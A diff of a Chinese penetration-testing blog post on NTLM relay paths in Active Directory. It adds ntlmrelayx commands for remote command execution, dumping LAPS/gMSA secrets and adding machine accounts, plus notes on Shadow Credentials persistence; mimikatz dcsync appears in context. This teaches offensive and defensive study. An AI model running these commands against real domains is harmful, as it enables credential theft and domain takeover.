@@ -6,10 +6,12 @@
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
         <title>NTLM Relay - 柠檬k</title><meta name="Description" content="Personal Blog"><meta property="og:title" content="NTLM Relay" />
-<meta property="og:description" content="本篇主要围绕下图进行。来自
+<meta property="og:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+NTLM 篇 - windows protocol
+NTLM Relay - hackndo
+本篇主要围绕下图进行。来自
 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
 &#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
-原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
 触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
  MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
 MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
@@ -18,10 +20,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
  Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
 强制身份验证通过 SMB 进行。
 上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
- ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。
-滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。
- https://github.com/ShutdownRepo/ShadowCoerce
-1  python3 shadowcoerce." />
+ ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://songzhiv.github.io/ntlm-relay/" /><meta property="og:image" content="https://songzhiv.github.io/static/favicon.ico"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-02-18T17:10:15+08:00" />
@@ -31,10 +30,12 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <meta name="twitter:image" content="https://songzhiv.github.io/static/favicon.ico"/>
 
 <meta name="twitter:title" content="NTLM Relay"/>
-<meta name="twitter:description" content="本篇主要围绕下图进行。来自
+<meta name="twitter:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+NTLM 篇 - windows protocol
+NTLM Relay - hackndo
+本篇主要围绕下图进行。来自
 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
 &#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
-原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
 触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
  MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
 MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
@@ -43,10 +44,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
  Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
 强制身份验证通过 SMB 进行。
 上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
- ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。
-滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。
- https://github.com/ShutdownRepo/ShadowCoerce
-1  python3 shadowcoerce."/>
+ ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。"/>
 <meta name="application-name" content="柠檬k">
 <meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -63,7 +61,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/ntlm-relay\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  359 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  421 ,
         "url": "https:\/\/songzhiv.github.io\/ntlm-relay\/","datePublished": "2022-02-18T17:10:15+08:00","dateModified": "2022-02-18T17:10:15+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -140,7 +138,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">NTLM Relay</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ad%E5%9F%9F/"><i class="far fa-folder fa-fw"></i>AD域</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 359 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 421 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -181,9 +179,9 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
         <li><a href="#adcs-esc8">ADCS ESC8</a></li>
         <li><a href="#cred-dump">Cred Dump</a></li>
         <li><a href="#exec">EXEC</a></li>
-        <li><a href="#枚举信息">枚举信息</a></li>
+        <li><a href="#枚举域内信息">枚举域内信息</a></li>
         <li><a href="#创建用户ldaps">创建用户（LDAPS）</a></li>
-        <li><a href="#exchange高权限">Exchange（高权限）</a></li>
+        <li><a href="#exchange">Exchange</a></li>
         <li><a href="#影子凭证shadow-credentials">影子凭证（Shadow Credentials）</a></li>
         <li><a href="#rbcd低权限">RBCD（低权限）</a></li>
       </ul>
@@ -191,7 +189,10 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
     <li><a href="#参考">参考</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>本篇主要围绕下图进行。<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">来自</a></p>
+            </div><div class="content" id="content"><p>本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：</p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian" target="_blank" rel="noopener noreffer">NTLM 篇 - windows protocol</a></p>
+<p><a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">NTLM Relay - hackndo</a></p>
+<p>本篇主要围绕下图进行。<a href="https://www.thehacker.recipes/ad/movement/ntlm/relay" target="_blank" rel="noopener noreffer">来自</a></p>
 <p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" title="NTLM relay.drawio.png" data-thumbnail="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" data-sub-html="<h2>https://www.thehacker.recipes/ad/movement/ntlm/relay</h2><p>NTLM relay.drawio.png</p>">
         <img
             class="lazyload"
@@ -202,7 +203,6 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
             alt="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" />
     </a><figcaption class="image-caption">https://www.thehacker.recipes/ad/movement/ntlm/relay</figcaption>
     </figure></p>
-<p>原理直接看国外老哥写的这篇文章<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">NTLM RELAY</a>。本文主要讲Relay的一些路径。</p>
 <h2 id="触发ntlm认证">触发NTLM认证。</h2>
 <h3 id="smb">SMB</h3>
 <h4 id="petitpotamms-efsr">PetitPotam（MS-EFSR）</h4>
@@ -454,16 +454,73 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p>mimikatz</p>
 <p><code>lsadump::dcsync /all</code></p>
 <h3 id="cred-dump">Cred Dump</h3>
-<p>ntlmrelayx.py -t smb://$TARGET</p>
+<p>敬请期待</p>
+<p><a href="https://github.com/SecureAuthCorp/impacket/pull/1253" target="_blank" rel="noopener noreffer">https://github.com/SecureAuthCorp/impacket/pull/1253</a></p>
 <h3 id="exec">EXEC</h3>
-<p>ntlmrelayx.py -t smb://$TARGET -c whoami</p>
-<h3 id="枚举信息">枚举信息</h3>
-<p>ntlmrelayx -t &ldquo;ldap://domaincontroller&rdquo; &ndash;dump-adcs &ndash;dump-laps &ndash;dump-gmsa</p>
+<p>python3 ntlmrelayx.py -t smb://10.10.10.15 &ndash;remove-mic -c whoami</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png"
+        data-srcset="https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png, https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png 1.5x, https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png"
+        title="image-20220219230131789" /></p>
+<h3 id="枚举域内信息">枚举域内信息</h3>
+<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug &ndash;dump-laps &ndash;dump-gmsa &ndash;remove-mic<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png"
+        data-srcset="https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png, https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png 1.5x, https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png"
+        title="image-20220219230609579" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png"
+        data-srcset="https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png, https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png 1.5x, https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png"
+        title="image-20220219230750303" /></p>
 <h3 id="创建用户ldaps">创建用户（LDAPS）</h3>
-<p>ntlmrelayx.py -t ldaps://<strong>$DC_TARGET</strong> &ndash;add-computer username</p>
-<h3 id="exchange高权限">Exchange（高权限）</h3>
+<ol>
+<li><strong>添加机器账户</strong>：</li>
+</ol>
+<p>域有个属性<code>ms-DS-MachineAccountQuota</code> 他标志着非特权用户最多添加多少机器账户到域内。默认为10。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png"
+        data-srcset="https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png, https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png 1.5x, https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png"
+        title="image-20220219234336853" /></p>
+<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 &ndash;add-computer testpc$ &ndash;remove-mic</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png"
+        data-srcset="https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png, https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png 1.5x, https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png"
+        title="image-20220219234418973" /></p>
+<ol start="2">
+<li><strong>添加普通用户</strong></li>
+</ol>
+<p>需要高权限账户（比如说域管）才可以，</p>
+<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 &ndash;remove-mic</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png"
+        data-srcset="https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png, https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png 1.5x, https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png"
+        title="image-20220219234738893" /></p>
+<h3 id="exchange">Exchange</h3>
 <p><strong>存在CVE-2019-1040漏洞的情况下，可以从SMB-&gt;LDAP(s)。而无需考虑签名的情况。</strong></p>
-<p>Exchange的机器账户对域有WriteDACL权限。即可以赋予任意用户两条ACE：</p>
+<p>Exchange的机器账户是域内的高权限账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：</p>
 <ul>
 <li>复制目录更改</li>
 <li>复制目录更改所有项</li>
@@ -508,7 +565,9 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         alt="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png"
         title="image.png" /></p>
 <h3 id="影子凭证shadow-credentials">影子凭证（Shadow Credentials）</h3>
-<p>隐蔽权限维持。</p>
+<ol>
+<li>隐蔽权限维持。</li>
+</ol>
 <blockquote>
 <p>常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​</p>
 </blockquote>
@@ -587,6 +646,13 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
         data-sizes="auto"
         alt="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png"
         title="image.png" /></p>
+<ol start="2">
+<li>结合NTLM Relay</li>
+</ol>
+<p><a href="https://github.com/SecureAuthCorp/impacket/pull/1249" target="_blank" rel="noopener noreffer">https://github.com/SecureAuthCorp/impacket/pull/1249</a></p>
+<blockquote>
+<p>用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。<a href="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials" target="_blank" rel="noopener noreffer">Shadow Credentials - The Hacker Recipes</a></p>
+</blockquote>
 <h3 id="rbcd低权限">RBCD（低权限）</h3>
 <p>当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。</p>
 <h2 id="参考">参考</h2>
@@ -595,6 +661,7 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484864&amp;idx=1&amp;sn=94260cb4a4e643764f4cfd3565ae799b" target="_blank" rel="noopener noreffer">[域渗透] SQLSERVER 结合中继与委派</a></p>
 <p><a href="https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ" target="_blank" rel="noopener noreffer">安全研究 | 使用PetitPotam代替Printerbug</a></p>
 <p><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" target="_blank" rel="noopener noreffer">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members</a></p>
+<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials" target="_blank" rel="noopener noreffer">Shadow Credentials - The Hacker Recipes</a></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
